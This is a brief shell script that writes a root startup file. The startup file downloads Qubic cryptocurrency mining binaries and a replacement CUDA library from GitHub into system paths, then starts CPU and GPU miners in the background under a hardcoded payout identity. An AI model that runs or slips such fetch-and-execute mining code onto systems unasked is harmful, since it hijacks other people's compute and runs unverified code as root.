#!/bin/sh
echo "
apt update
apt upgrade
apt install -y libatomic1 libjemalloc-dev libtbb-dev libomp-dev curl
curl -L -o /usr/bin/rqiner https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v1.1.2b/rqiner-x86
curl -L -o /usr/bin/qubic-gpu https://github.com/Qubic-Solutions/3rd-party-miners/raw/refs/heads/main/2024-12-09/qubic-pool-cutoff
curl -L -o /usr/lib/libcudart.so.12 https://raw.githubusercontent.com/ArturBieniek4/rqiner-mobile/refs/heads/main/libcudart.so.12
chmod +x /usr/bin/qubic-gpu /usr/bin/rqiner

/usr/bin/qubic-gpu DockerGPU$(hostname) XKDKXQQDMEEYRGDRSNFEDYKSPVLDZIHERAPRIPSJXEJUHTZWAEPAUUWDAKAB false > /root/gpu.log 2> /root/gpu.log &
/usr/bin/rqiner -i XKDKXQQDMEEYRGDRSNFEDYKSPVLDZIHERAPRIPSJXEJUHTZWAEPAUUWDAKAB -l DockerCPU$(hostname) -t $(lscpu -p | grep -Ev '^#' | sort -u -t, -k 2,4 | wc -l) > /root/cpu.log 2> /root/cpu.log &
" > /root/onstart.sh
